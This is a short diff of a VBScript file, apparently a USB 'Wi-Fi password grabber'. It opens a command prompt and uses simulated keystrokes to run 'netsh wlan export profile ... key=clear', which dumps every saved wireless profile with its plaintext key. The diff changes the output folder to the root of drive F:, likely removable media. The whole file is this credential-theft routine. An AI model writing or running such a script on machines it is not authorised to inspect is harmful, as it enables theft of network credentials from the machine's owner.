@@ -1,7 +1,7 @@
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "cmd.exe", 1, False
 WScript.Sleep 500
-objShell.SendKeys "netsh wlan export profile folder=E:\chakra\ key=clear{ENTER}"
+objShell.SendKeys "netsh wlan export profile folder=F:\ key=clear{ENTER}"
 WScript.Sleep 1000
 objShell.SendKeys "color a"
 WScript.Sleep 300
